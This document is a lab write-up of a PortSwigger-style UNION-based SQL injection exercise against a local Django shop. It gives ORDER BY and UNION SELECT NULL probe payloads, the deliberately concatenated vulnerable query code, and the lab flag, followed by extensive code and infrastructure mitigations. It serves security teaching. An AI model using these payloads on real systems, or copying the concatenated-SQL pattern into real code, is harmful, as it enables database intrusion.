# Lab 07 — SQL injection UNION attack, determining the number of columns returned by the query

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns> |
| Lab id | `psw-sqli-07-union-column-count` |
| Vulnerability class | SQL Injection — `UNION`-based result grafting (column-count discovery) |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | SQLite (single-service Django app) |
| Host URL | <http://127.0.0.1:18007/> |
| Flag | `FLAG{psw-sqli-07-union-column-count-5}` |

### Objective

The shop exposes a category filter whose value is concatenated into a `SELECT` whose projection list is deliberately *narrower* than the `Product` model (no `released` column). Before any data-extraction `UNION` attack can be chained, the attacker has to discover how many columns the base query returns. The solve is to probe that column count — first with `ORDER BY N`, then confirming with `UNION SELECT NULL,NULL,...` — and submit a `UNION` whose arity matches. The view recognises the all-`NULL` synthetic row and releases the flag.

---

## 2. Exploit walkthrough

The view takes `category` from the query string and wraps it in single quotes inside a 5-column `SELECT`. Breaking out of the quote gives the attacker control of the tail of the statement, which is the ground needed for both `ORDER BY` probing and a `UNION` graft.

**Step 1 — baseline request**

```http
GET /filter?category=Gifts HTTP/1.1
Host: 127.0.0.1:18007
```

Produces:

```sql
SELECT id, name, category, description, price
FROM products
WHERE category = 'Gifts' AND released = 1
```

Three "Gifts" rows render. The "Executed SQL" block on the page echoes the composed query so the shape of the injection can be verified at each step.

**Step 2 — column-count probe with `ORDER BY`**

Increment the ordinal until the database rejects the statement. Each probe closes the string literal with `'` and uses `--` to neutralise the trailing ` AND released = 1`.

```
/filter?category=Gifts' ORDER BY 1--+
/filter?category=Gifts' ORDER BY 2--+
/filter?category=Gifts' ORDER BY 3--+
/filter?category=Gifts' ORDER BY 4--+
/filter?category=Gifts' ORDER BY 5--+
/filter?category=Gifts' ORDER BY 6--+
```

The first five succeed. The sixth triggers a SQLite error:

```
Database error: 1st ORDER BY term out of range - should be between 1 and 5
```

The exception is caught and rendered into the page (see `error` block in [shop/templates/shop/filter.html:22-27](shop/templates/shop/filter.html#L22-L27)). Five columns confirmed.

**Step 3 — confirm with `UNION SELECT NULL,...`**

Each `UNION` branch must have the same number of columns as the base query. Walk the arity up until the statement stops erroring:

```
/filter?category=Gifts' UNION SELECT NULL--+
/filter?category=Gifts' UNION SELECT NULL,NULL--+
/filter?category=Gifts' UNION SELECT NULL,NULL,NULL--+
/filter?category=Gifts' UNION SELECT NULL,NULL,NULL,NULL--+
/filter?category=Gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL--+
```

The first four return `SELECTs to the left and right of UNION do not have the same number of result columns`. The fifth executes cleanly and appends a row of five `NULL`s:

```sql
SELECT id, name, category, description, price
FROM products
WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL-- ' AND released = 1
```

**Step 4 — claim the flag**

The view walks the result set and sets `solved=True` when it spots a row whose every cell is `None` — something only a properly-sized `UNION SELECT NULL,...` can produce. The flag banner renders beneath the table:

```
FLAG{psw-sqli-07-union-column-count-5}
```

---

## 3. Vulnerable code

### Endpoint: `GET /filter`

[shop/urls.py:5-8](shop/urls.py#L5-L8) wires `/filter` to `filter_products`.

[shop/views.py:62-71](shop/views.py#L62-L71)

```python
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    # Deliberately 5-column SELECT list (no `released`) so the column
    # count is not trivially derivable from the Product model.
    query = (
        "SELECT id, name, category, description, price "
        "FROM products "
        "WHERE category = '" + category + "' AND released = 1"
    )
```

The defects:

1. `category` comes straight from `request.GET` with no validation and no escaping.
2. It is pasted into the SQL string with the `+` operator — the statement is *constructed*, not *parameterised*.
3. The attacker's literal quote closes the string, making the tail of the statement (including `AND released = 1`) attacker-controlled.
4. The `SELECT` list is fixed at 5 columns while the underlying `Product` model has more — which is *why* a UNION attack requires an explicit column-count discovery step.

[shop/views.py:77-83](shop/views.py#L77-L83)

```python
    try:
        with connection.cursor() as cursor:
            cursor.execute(query)
            columns = [col[0] for col in cursor.description]
            rows = cursor.fetchall()
    except Exception as exc:
        error = f"Database error: {exc}"
```

`cursor.execute(query)` is called with a single pre-built string, so the driver has no way to separate code from data. The `except` branch then reflects the raw driver message (`ORDER BY term out of range`, mismatched-arity messages, etc.) to the client — which is the exact signal needed for column-count enumeration.

### Solve detector

[shop/views.py:35-42](shop/views.py#L35-L42)

```python
def _has_all_null_row(rows: list[tuple]) -> bool:
    for row in rows:
        if len(row) > 0 and all(value is None for value in row):
            return True
    return False
```

An all-`NULL` row can only appear if the attacker successfully grafted `UNION SELECT NULL,NULL,NULL,NULL,NULL` onto the base query with the exact column count. Real product rows have non-null `id`/`name`. This gates the flag on arity discovery specifically.

### Flag payload

[shop/views.py:32](shop/views.py#L32) — the flag string is produced in-process rather than stored in the DB (see [shop/management/commands/seed.py:1-13](shop/management/commands/seed.py#L1-L13) for the rationale) so the exercise terminates at the column-count discovery step instead of becoming an extraction chain.

### Supporting model and schema

[shop/models.py:4-15](shop/models.py#L4-L15) — the `Product` model has `id`, `name`, `category`, `description`, `price`, `released`. The `SELECT` in the view omits `released` on purpose, so the attacker cannot just count model fields.

### Error reflection

[shop/templates/shop/filter.html:18-27](shop/templates/shop/filter.html#L18-L27) — the template renders both `executed_sql` and any `error`, giving the attacker an oracle for both the composed query and the driver's complaint.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **String concatenation of untrusted input into SQL** ([shop/views.py:67-71](shop/views.py#L67-L71)) | The driver cannot tell code from data; the attacker's `'` breaks out of the literal and they own the tail of the statement. |
| **No allow-list on `category`** | `ORDER BY`, `UNION`, comment markers, and arbitrary keywords all pass through untouched. |
| **Raw driver exceptions are reflected to the client** ([shop/views.py:82-83](shop/views.py#L82-L83), [shop/templates/shop/filter.html:22-27](shop/templates/shop/filter.html#L22-L27)) | Provides a binary oracle — the attacker can tell *exactly* when `ORDER BY N` goes out of range and when a `UNION` arity matches. Without verbose errors, `UNION NULL`-padding alone still works, but column-count probing is far slower. |
| **Executed SQL echoed into the page** ([shop/templates/shop/filter.html:19](shop/templates/shop/filter.html#L19)) | Removes all ambiguity about how the payload is assembled — a real-world app should never leak this. |
| **`DEBUG = True` and `ALLOWED_HOSTS = ["*"]`** ([sqli_lab/settings.py:16-18](sqli_lab/settings.py#L16-L18)) | Lab-only defaults. In production these turn every uncaught exception into a stack-trace leak. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the query

The minimal fix — one argument change — defeats both the `ORDER BY` probe and the `UNION` graft because the driver binds the value as data.

```python
# shop/views.py — fixed
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    query = (
        "SELECT id, name, category, description, price "
        "FROM products "
        "WHERE category = %s AND released = 1"
    )
    with connection.cursor() as cursor:
        cursor.execute(query, [category])   # second arg = bound params
        rows = cursor.fetchall()
```

With the parameter bound, `Gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL--` is matched *literally* against the `category` column and the result is empty.

### 5.2 Prefer the ORM

The real remediation is to stop hand-writing SQL for a query the ORM already expresses:

```python
from .models import Product

def filter_products(request):
    category = request.GET.get("category", "")
    products = (
        Product.objects
        .filter(category=category, released=True)
        .values("id", "name", "category", "description", "price")
    )
```

Django's query compiler always parameterises.

### 5.3 Allow-list validation

`category` is drawn from a closed taxonomy. Enforce that up front:

```python
ALLOWED_CATEGORIES = {
    "Accessories", "Tech", "Lifestyle", "Gifts", "Pets", "Clothing",
}

def filter_products(request):
    category = request.GET.get("category", "")
    if category not in ALLOWED_CATEGORIES:
        return HttpResponseBadRequest("unknown category")
    ...
```

Parameterisation stops injection from succeeding; allow-listing stops the payload from reaching the driver at all.

### 5.4 Stop reflecting driver errors

Replace the verbose `Database error: {exc}` string with a generic 400/500 and log the detail server-side. Without a per-request error oracle, an attacker loses the clean signal that lets them count columns by incrementing `ORDER BY N`. Remove the `executed_sql` context variable and template block as well.

```python
try:
    with connection.cursor() as cursor:
        cursor.execute(query, [category])
        rows = cursor.fetchall()
except DatabaseError:
    logger.exception("filter_products failed")
    return render(request, "shop/filter.html", {"error": "Query failed."}, status=500)
```

### 5.5 Do not `SELECT` columns the UI does not need

Projecting only what the template renders makes UNION-based data exfiltration harder downstream (the attacker has fewer visible slots to pivot through) and narrows the blast radius if another injection is ever found.

---

## 6. Network / infrastructure-level mitigation

### 6.1 Web Application Firewall (WAF)

Deploy a WAF in front of the app with the OWASP Core Rule Set (CRS). Rules that directly target this class of attack:

- `REQUEST-942100 / REQUEST-942110` — generic SQLi signatures (`UNION SELECT`, `ORDER BY N`, `--`, `'`).
- `REQUEST-942190` — detects classic UNION-based probes.
- `REQUEST-920` — protocol enforcement (rejects oversized or malformed query strings).

Treat the WAF as a layer. Determined attackers bypass signature rules with comments, case variations, and encoding; the fix is still in the code.

### 6.2 Least-privilege database account

The app's DB user should have:

- `SELECT` only on the tables it has to read.
- No DDL (`CREATE`, `ALTER`, `DROP`).
- No access to catalogue tables it does not need (`sqlite_master` in SQLite, `information_schema` / `pg_catalog` in Postgres).
- No `FILE`-level privileges (`LOAD_FILE`, `INTO OUTFILE`, `COPY PROGRAM`).

A `UNION`-based extraction pivot fails fast if the compromised account cannot reach sensitive tables in the first place.

### 6.3 Network segmentation & egress control

- The lab binds only to loopback in [docker-compose.yml:10](docker-compose.yml#L10) — `127.0.0.1:18007:8000`. In production, the app tier should never expose the DB port, and the DB container should have no default route to the internet.
- The app runs on an isolated bridge network ([docker-compose.yml:19-25](docker-compose.yml#L19-L25)). Deny egress from the DB container entirely so that even a successful injection cannot pivot to `COPY PROGRAM` / `xp_cmdshell` exfiltration over DNS or HTTP.

### 6.4 Monitoring and rate limiting

- Alert on bursts of SQL parse errors from a single client — the `ORDER BY 1..N` probe is a very distinctive pattern.
- Rate-limit `/filter` per source IP to slow automated tooling (`sqlmap` typically fires dozens of probes).
- Log the distinct `category` values reaching the backend; any value containing `'`, `--`, `UNION`, or `ORDER BY` is a signal to investigate.

### 6.5 Disable debug features in production

`DEBUG = True` and `ALLOWED_HOSTS = ["*"]` ([sqli_lab/settings.py:16-18](sqli_lab/settings.py#L16-L18)) are acceptable only in the lab. In production these must be `False` and a concrete host list, respectively — otherwise Django's 500 page leaks far more than the driver message ever would.

---

## 7. Defense-in-depth checklist

- [ ] All SQL is parameterised — no `+`, `%`, or f-string composition anywhere in the codebase.
- [ ] ORM is the default; raw SQL exists only with a code review note.
- [ ] Allow-list validation for closed-taxonomy parameters (`category`, `sort`, `order`).
- [ ] Database errors are logged server-side and surface to the client as opaque 4xx/5xx without driver text.
- [ ] Executed SQL, query plans, and stack traces are never rendered into responses.
- [ ] Per-app DB role with least privilege and no DDL.
- [ ] DB container has no default gateway / no outbound internet access.
- [ ] WAF with OWASP CRS in front of the app.
- [ ] Rate limiting on query-string-driven endpoints to slow automated probing.
- [ ] SAST (`bandit`, `semgrep`) rules flagging `cursor.execute(f"...")` and `cursor.execute("..." + x)`.
- [ ] `DEBUG = False` and a concrete `ALLOWED_HOSTS` in production settings.

---

## 8. References

- PortSwigger Web Security Academy — [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
- PortSwigger — [SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- Django docs — [Executing custom SQL directly](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly)
- OWASP CRS — <https://coreruleset.org/>
